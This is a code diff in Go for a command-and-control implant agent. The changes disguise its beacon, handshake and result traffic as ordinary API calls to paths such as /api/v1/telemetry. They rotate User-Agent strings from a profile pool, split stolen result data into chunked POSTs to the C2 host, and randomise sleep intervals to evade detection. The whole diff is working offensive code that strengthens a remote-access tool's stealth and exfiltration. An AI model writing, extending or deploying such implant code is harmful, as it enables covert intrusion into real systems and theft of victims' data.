@@ -12,6 +12,7 @@ import (
 	"math/big"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -19,7 +20,7 @@ import (
 )
 
 func resolveC2() string {
-	client := &http.Client{Timeout: 30 * time.Second}
+	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
 	resp, err := client.Get(RESOLVER_URL)
 	if err != nil {
 		return ""
@@ -30,6 +31,40 @@ func resolveC2() string {
 		return ""
 	}
 	return strings.TrimSpace(string(body))
+}
+
+// endpoint builds the full URL for a logical message type from the profile.
+func endpoint(kind string) string {
+	p := PROFILE.Paths[kind]
+	if p == "" {
+		switch kind {
+		case "handshake":
+			p = "/api/v1/auth"
+		case "beacon":
+			p = "/api/v1/sync"
+		case "result":
+			p = "/api/v1/telemetry"
+		default:
+			p = "/"
+		}
+	}
+	return C2_ADDRESS + p
+}
+
+// profileHeaders sets a random User-Agent (from the profile pool) plus the
+// static profile headers on the request.
+func profileHeaders(req *http.Request) {
+	ua := "Mozilla/5.0"
+	if len(PROFILE.UserAgents) > 0 {
+		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(PROFILE.UserAgents))))
+		if err == nil {
+			ua = PROFILE.UserAgents[n.Int64()]
+		}
+	}
+	req.Header.Set("User-Agent", ua)
+	for k, v := range PROFILE.Headers {
+		req.Header.Set(k, v)
+	}
 }
 
 func performHandshake() {
@@ -65,12 +100,12 @@ func performHandshake() {
 	}
 
 	client := &http.Client{Timeout: 10 * time.Second, Transport: C2_TRANSPORT}
-	req, err := http.NewRequest("POST", C2_ADDRESS, bytes.NewBuffer([]byte(encryptedPacket)))
+	req, err := http.NewRequest("POST", endpoint("handshake"), bytes.NewBuffer([]byte(encryptedPacket)))
 	if err != nil {
 		queueError("handshake_req")
 		return
 	}
-	req.Header.Set("User-Agent", USER_AGENT)
+	profileHeaders(req)
 	req.Header.Set("ngrok-skip-browser-warning", "true")
 	req.Header.Set("X-Agent-ID", AGENT_ID)
 
@@ -131,12 +166,12 @@ func beacon() {
 	}
 	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
 
-	req, err := http.NewRequest("GET", C2_ADDRESS, nil)
+	req, err := http.NewRequest("GET", endpoint("beacon"), nil)
 	if err != nil {
 		C2_ADDRESS = ""
 		return
 	}
-	req.Header.Set("User-Agent", USER_AGENT)
+	profileHeaders(req)
 	req.Header.Set("ngrok-skip-browser-warning", "true")
 	req.Header.Set("X-Agent-ID", AGENT_ID)
 
@@ -231,20 +266,58 @@ func sendErrorLog(msg string) {
 
 func postResult(encryptedData string) {
 	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
-	req, err := http.NewRequest("POST", C2_ADDRESS, bytes.NewBuffer([]byte(encryptedData)))
+	maxBytes := PROFILE.MaxBodyKB * 1024
+	if maxBytes <= 0 {
+		maxBytes = 256 * 1024
+	}
+
+	if len(encryptedData) <= maxBytes {
+		postChunk(client, encryptedData, 0, 1)
+		return
+	}
+
+	total := (len(encryptedData) + maxBytes - 1) / maxBytes
+	for i := 0; i < len(encryptedData); i += maxBytes {
+		end := i + maxBytes
+		if end > len(encryptedData) {
+			end = len(encryptedData)
+		}
+		postChunk(client, encryptedData[i:end], i/maxBytes, total)
+	}
+}
+
+func postChunk(client *http.Client, chunk string, idx, total int) {
+	req, err := http.NewRequest("POST", endpoint("result"), bytes.NewBufferString(chunk))
 	if err != nil {
 		queueError("post_req")
 		return
 	}
-	req.Header.Set("User-Agent", USER_AGENT)
+	profileHeaders(req)
 	req.Header.Set("ngrok-skip-browser-warning", "true")
 	req.Header.Set("X-Agent-ID", AGENT_ID)
+	if total > 1 {
+		req.Header.Set("X-Chunk-Index", strconv.Itoa(idx))
+		req.Header.Set("X-Chunk-Total", strconv.Itoa(total))
+	}
 	client.Do(req)
 }
 
 func sleepWithJitter() {
-	n, _ := rand.Int(rand.Reader, big.NewInt(100))
-	drift := float64(SLEEP_TIME) * JITTER
-	randomDrift := (float64(n.Int64()) / 100.0 * 2 * drift) - drift
-	time.Sleep(time.Duration(float64(SLEEP_TIME) + randomDrift))
+	min := PROFILE.Sleep.MinSeconds
+	max := PROFILE.Sleep.MaxSeconds
+	if max < min {
+		max = min
+	}
+	span := max - min
+
+	secs := min
+	if span > 0 {
+		n, err := rand.Int(rand.Reader, big.NewInt(int64(span)+1))
+		if err == nil {
+			secs = min + int(n.Int64())
+		}
+	}
+	m, _ := rand.Int(rand.Reader, big.NewInt(1000))
+	drift := time.Duration(m.Int64()) * time.Millisecond
+	time.Sleep(time.Duration(secs)*time.Second + drift)
 }
